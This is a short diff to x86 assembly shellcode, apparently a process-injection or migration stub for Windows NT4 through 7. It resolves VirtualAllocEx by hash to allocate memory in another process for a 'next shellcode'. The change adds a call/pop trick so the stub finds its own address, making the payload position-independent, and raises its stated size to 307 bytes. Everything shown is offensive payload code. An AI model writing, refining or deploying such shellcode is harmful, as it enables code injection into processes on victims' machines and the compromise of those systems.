@@ -1,7 +1,7 @@
 ;-----------------------------------------------------------------------------;
 ; Author: agix (florian.gaultier[at]gmail[dot]com)
 ; Compatible: Windows 7, 2008, Vista, 2003, XP, 2000, NT4
-; Size: 137 bytes
+; Size: 307 bytes
 ;-----------------------------------------------------------------------------;
 
 [BITS 32]
@@ -44,9 +44,13 @@ push ecx		;hProcess
 push 0x3F9287AE ;call VirtualAllocEx()
 call ebp
 
+call me2
+me2:
+pop edx
+
 mov edi, eax
 mov ecx, [esi]
-lea edx, [ebp+0x12a] ;pointer on the next shellcode
+lea edx, [edx+0x47] ;pointer on the next shellcode
 push esp
 push 0x00001000	;Next Shellcode Size
 push edx		;
